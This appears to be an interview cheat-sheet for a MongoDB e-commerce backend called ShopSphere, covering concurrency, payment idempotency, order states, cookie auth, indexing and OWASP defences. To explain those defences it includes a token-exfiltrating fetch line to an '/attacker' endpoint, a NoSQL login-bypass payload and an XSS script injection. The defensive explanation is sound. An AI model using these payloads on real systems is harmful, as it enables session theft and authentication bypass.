# ShopSphere Engineering Interview Cheat-Sheet & Architecture Deep-Dive

This document serves as the technical master guide for explaining **ShopSphere's** engineering trade-offs, architecture decisions, concurrency controls, and security posture during senior software engineering (SDE) interviews.

---

## 1. High-Contention Concurrency & Race Condition Prevention

### The Problem
In flash sales or high-demand product drops, hundreds of concurrent users may attempt to purchase the remaining 3 units of an item simultaneously. A naive implementation that executes `SELECT stock -> IF stock >= qty -> UPDATE stock` suffers from the classic **Time-of-Check to Time-of-Use (TOCTOU)** race condition, leading to catastrophic overselling and negative inventory.

### Strategies Evaluated

| Strategy | Mechanism | Pros | Cons / Verdict |
| :--- | :--- | :--- | :--- |
| **Pessimistic Locking (`SELECT ... FOR UPDATE`)** | Locks rows/documents at the database engine level until transaction commits. | Strong consistency. | Serializes throughput, high lock contention, risk of deadlocks under load. Not natively supported in standard document-level MongoDB without multi-document ACID transactions. |
| **Distributed Locks (Redis Redlock)** | Acquires an exclusive distributed mutex key with TTL before mutating DB. | Prevents DB-level contention. | Adds architectural complexity (Redis dependency), split-brain risks under network partitions, latency overhead of network hops. |
| **Optimistic Concurrency Control (Version Numbers)** | Checks `__v === expectedVersion` during update; fails and rolls back if version changed. | Non-blocking reads. | High abort/retry rates under high contention; wasted compute on retries. |
| **Conditional Atomic Decrement (ShopSphere Approach)** | Single atomic DB operation: `findOneAndUpdate({ _id, stock: { $gte: qty } }, { $inc: { stock: -qty } })` | **Optimal:** Atomic at the storage engine level (WiredTiger ticket), zero lock contention overhead, strictly zero overselling. | **Chosen Solution.** |

### Implementation in ShopSphere
```javascript
// server/src/services/orderService.js
const reservedProduct = await Product.findOneAndUpdate(
  {
    _id: item.productId,
    stock: { $gte: item.quantity },
    isActive: true
  },
  {
    $inc: { stock: -item.quantity }
  },
  { new: true, session }
);

if (!reservedProduct) {
  throw new AppError(
    `Insufficient stock for "${item.title}". Requested: ${item.quantity}.`,
    409,
    'INSUFFICIENT_STOCK'
  );
}
```

### Verification Proof
Verified in [`server/tests/inventoryConcurrency.test.js`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/tests/inventoryConcurrency.test.js):
- **Scenario:** 10 simultaneous checkout requests fired concurrently (`Promise.all`) competing for a product with initial `stock = 3`.
- **Result:** Exactly 3 checkouts succeeded (`HTTP 201 Created`), 7 requests failed gracefully (`HTTP 409 Conflict: INSUFFICIENT_STOCK`), and final product stock was verified to be strictly `0` (zero overselling).

---

## 2. Payment Idempotency & Dual-Path Finalization

### The Problem
Payment gateways operate asynchronously over unreliable networks. When a customer pays:
1. The browser might drop the connection before submitting Razorpay signature verification.
2. The user might refresh or double-click the verification button.
3. Razorpay's asynchronous webhook (`payment.captured`) arrives simultaneously with the client's verification request.
Processing both concurrently can cause duplicate fulfillment, corrupted financial accounting, or conflicting state updates.

### ShopSphere Dual-Channel Architecture

```text
       [ Customer Browser ]                     [ Razorpay Gateway ]
                │                                         │
        1. Open Modal                                     │
                │ ────── (Customer Pays) ───────────────> │
                │                                         │
        2. Client Signature                               3. Webhook Event
           Verification                                      (order.paid)
                │                                         │
                ▼                                         ▼
   POST /payments/verify                     POST /payments/webhook
   (HMAC SHA256 Verification)                (HMAC SHA256 Verification)
                │                                         │
                └───────────────┬─────────────────────────┘
                                ▼
         [ Atomic Payment Reconciliation Lock ]
         Order.findOneAndUpdate(
           {
             _id: orderId,
             paymentStatus: { $ne: 'PAID' } // IDEMPOTENCY GUARD
           },
           {
             $set: {
               paymentStatus: 'PAID',
               status: 'CONFIRMED',
               paidAt: new Date(),
               'paymentDetails.paymentId': razorpayPaymentId
             }
           }
         )
                                │
             ┌──────────────────┴──────────────────┐
             ▼                                     ▼
     [ Lock Acquired ]                     [ Lock Denied ]
  - Transition order to CONFIRMED       - Order already PAID
  - Clear user cart                     - Return HTTP 200 (Idempotent OK)
  - Record audit log                    - Do not re-process
```

### Key Engineering Nuances:
1. **HMAC SHA-256 Signatures:** Both paths independently verify cryptographic signatures using `crypto.createHmac('sha256', secret)`.
2. **Conditional Atomic Update:** The filter `{ paymentStatus: { $ne: 'PAID' } }` guarantees that whichever path hits the database first (by even 1 millisecond) acquires the write lock. The second path receives `null` and safely exits with HTTP 200 without duplicate execution.
3. **Verified in Automated Concurrency Test:** [`server/tests/paymentIdempotency.test.js`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/tests/paymentIdempotency.test.js) fires client verification and server webhook simultaneously via `Promise.all`. Both return HTTP 200, exactly one performs the status mutation, and no duplicate transitions occur.

---

## 3. Order Lifecycle & Finite State Machine (FSM)

### FSM State Transition Graph

```text
                ┌───────────────────────────┐
                │      PENDING_PAYMENT      │
                └─────────────┬─────────────┘
                              │
               ┌──────────────┴──────────────┐
  [Payment Succeeded]                  [Payment Failed / Expired]
               ▼                                     ▼
        ┌─────────────┐                       ┌─────────────┐
        │  CONFIRMED  │                       │  CANCELLED  │
        └──────┬──────┘                       │  (Restocked)│
               │                              └─────────────┘
        [Admin Ships]                                ▲
               ▼                                     │
        ┌─────────────┐                              │
        │ PROCESSING  │ ─── [Customer Cancels] ──────┤
        └──────┬──────┘                              │
               │                                     │
        [Carrier Dispatched]                         │
               ▼                                     │
        ┌─────────────┐                              │
        │   SHIPPED   │ ─── [Customer Cancels] ──────┘
        └──────┬──────┘
               │
        [Delivered to Customer]
               ▼
        ┌─────────────┐
        │  DELIVERED  │ (Terminal State - Reviews Unlocked)
        └─────────────┘
```

### Auto-Restock on Cancellation
When an order is cancelled from `PENDING_PAYMENT`, `CONFIRMED`, `PROCESSING`, or `SHIPPED`:
- The system automatically iterates through all line items and invokes `$inc: { stock: item.quantity }` on each product.
- If the order was already paid (`CONFIRMED` or later), a refund record is automatically generated (`paymentStatus: REFUNDED`) with transaction references.

---

## 4. Authentication, Session Security & Cross-Domain Cookies

### Architectural Choice: HTTP-Only Cookies vs LocalStorage
- **Why NOT LocalStorage:** Storing JWTs in `window.localStorage` exposes authentication tokens to any Cross-Site Scripting (XSS) vulnerability. Any compromised third-party npm package or CDN script can execute `fetch('/attacker', { body: localStorage.getItem('token') })`.
- **ShopSphere Solution:** JWTs are issued inside an **HTTP-Only, Secure, SameSite** cookie:
  ```javascript
  res.cookie('token', token, {
    httpOnly: true,                                       // Inaccessible to client JS
    secure: process.env.NODE_ENV === 'production',        // HTTPS only
    sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax', // Cross-domain support
    partitioned: process.env.NODE_ENV === 'production',   // Chrome CHIPS standard
    maxAge: 7 * 24 * 60 * 60 * 1000                      // 7 days TTL
  });
  ```

### Stateless Verification + RBAC
- JWT payloads contain `{ id, role }`.
- Authentication middleware [`protect`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/auth.js) validates signature and verifies the user still exists in the database.
- Authorization middleware [`restrictTo('ADMIN')`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/auth.js) enforces strict role-based access control with HTTP 403 Forbidden envelopes.

---

## 5. Database Modeling: Embedding vs Referencing

### Embedded Snapshots for Line Items
In e-commerce, product prices, titles, and descriptions change over time. If orders merely referenced `product: ObjectId`, editing a product's price from $100 to $150 would retroactively distort all past accounting ledgers and customer invoices.

**ShopSphere Approach:**
- Orders store **denormalized snapshot line items**:
  ```json
  "items": [
    {
      "productId": "651a2b...",
      "title": "Sony WH-1000XM5",
      "price": 34999,
      "quantity": 1,
      "image": "https://..."
    }
  ]
  ```
- Historical orders remain immutable and accurate forever, regardless of future price hikes or product deletions.

### Referencing for Dynamic Relationships
- **Reviews:** Stored in a separate `reviews` collection referencing `user` and `product`. A compound unique index `{ product: 1, user: 1 }` enforces the business constraint of **one review per product per customer**.
- **Verified Buyer Constraint:** When submitting a review, the backend executes an authoritative check against the `orders` collection:
  ```javascript
  const verifiedOrder = await Order.findOne({
    customer: req.user._id,
    'items.productId': productId,
    status: 'DELIVERED'
  });
  ```
  Only customers with a completed, delivered order can leave a review.

---

## 6. Database Indexing Strategy (The ESR Rule)

To guarantee sub-20ms query response times under high load, compound indexes were designed following MongoDB's **Equality, Sort, Range (ESR)** heuristic:

1. **Catalog Search & Filter Index:**
   `Product.index({ isActive: 1, category: 1, price: 1 })`
   - **Equality:** `isActive: true`, `category: categoryId`
   - **Range / Sort:** `price: { $gte: min, $lte: max }` or `sort({ price: 1 })`
   - **Result:** Query plans execute an `IXSCAN` without in-memory sorting (`SORT_KEY_GENERATOR`), achieving linear index traversal.
2. **Text Index with Field Weights:**
   `Product.index({ title: 'text', description: 'text' }, { weights: { title: 10, description: 3 } })`
   - Prioritizes exact and keyword matches in product titles over broad descriptions.
3. **Cart Compound Index:**
   `Cart.index({ user: 1, 'items.product': 1 })`
   - Enables O(1) lookups during cart mutation and stock re-validation.

---

## 7. Defense-in-Depth Security Architecture (OWASP Top 10)

| Vulnerability | Attack Vector | ShopSphere Countermeasure |
| :--- | :--- | :--- |
| **NoSQL Injection** | Attacker injects `{ "email": { "$gt": "" } }` into login JSON body to bypass auth. | Custom [`sanitizeNoSQL`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/security.js) middleware recursively strips keys starting with `$` or containing `.`. |
| **Cross-Site Scripting (XSS)** | Injecting `<script src="malicious.js">` into product reviews or addresses. | Custom [`sanitizeXSS`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/security.js) middleware strips script tags from request bodies. |
| **Brute Force & Credential Stuffing** | Rapid automated password guessing on `/api/auth/login`. | Granular [`authLimiter`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/rateLimiter.js) strictly caps attempts to 10 requests per 15 minutes per IP with HTTP 429 envelopes. |
| **Inventory Denial-of-Service** | Bot scripts calling checkout repeatedly to lock all product stock into 15-minute reservations. | Dedicated [`checkoutLimiter`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/rateLimiter.js) caps checkout attempts to 20 per 15 minutes per IP. |
| **MIME Sniffing & Clickjacking** | Embedding site in malicious iframes or uploading fake MIME types. | [`helmet`](file:///e:/Projects/ShopSphere_Antigravity_PRD/server/src/middleware/security.js) enforces `nosniff`, `frameguard: { action: 'deny' }`, and strict CSP. |

---

## 8. SDE Interview Quick-Fire Q&A

**Q: How do you handle database connection drops or replica set elections?**  
*A: ShopSphere configures Mongoose with `retryWrites=true&w=majority`, auto-reconnect listeners, and exponential backoff retry. Queries fail gracefully through `AppError` without unhandled process crashes.*

**Q: How does the server prevent clients from tampering with product prices?**  
*A: The frontend cart never passes prices to the backend. The backend `cartService` and `orderService` treat client prices as untrusted hints: they re-query the MongoDB Atlas catalog, fetch the authoritative product price, verify active status, and compute all totals server-side.*

**Q: Why use `.lean()` in read-heavy queries?**  
*A: Mongoose documents instantiate substantial overhead for change-tracking, getters, setters, and internal state. For read-only operations (`GET /api/products`), `.lean()` returns plain JavaScript objects, reducing RAM footprint by ~60% and cutting latency by ~40%.*
